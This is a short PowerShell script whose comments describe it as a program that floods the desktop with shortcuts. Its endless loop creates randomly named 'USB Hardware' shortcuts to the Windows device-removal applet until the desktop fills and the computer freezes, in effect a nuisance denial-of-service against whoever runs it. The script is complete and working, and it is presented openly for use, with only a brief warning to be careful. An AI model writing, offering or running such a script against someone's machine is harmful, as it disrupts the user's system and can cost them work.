#Running this program will create new shortcuts on your desktop over and over. This program runs very quickly and fills up your desktop 
#in almost no time. Be careful where you run this. This program will freeze the computer for long periods of time depending on how long
#you run it.
while(1) 
{
    #assign num to a random number each time around so we can create new shortcuts with different names. We need different names for each
    #shortcut because any shortcut with the same name as a shortcut already on the desktop will not be shown. Therefore, we assign a
    #random number to num and place it into the shortcut name so we can create new shortcuts.
    $num = Get-Random
    $AppLocation = "C:\Windows\System32\rundll32.exe"
    $WshShell = New-Object -ComObject WScript.Shell
    
    #add num in the middle of the shortcut here
    $Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
    $Shortcut.TargetPath = $AppLocation
    $Shortcut.Arguments ="shell32.dll,Control_RunDLL hotplug.dll"
    $Shortcut.IconLocation = "hotplug.dll,0"
    $Shortcut.Description ="Device Removal"
    $Shortcut.WorkingDirectory ="C:\Windows\System32"
    $Shortcut.Save()
}
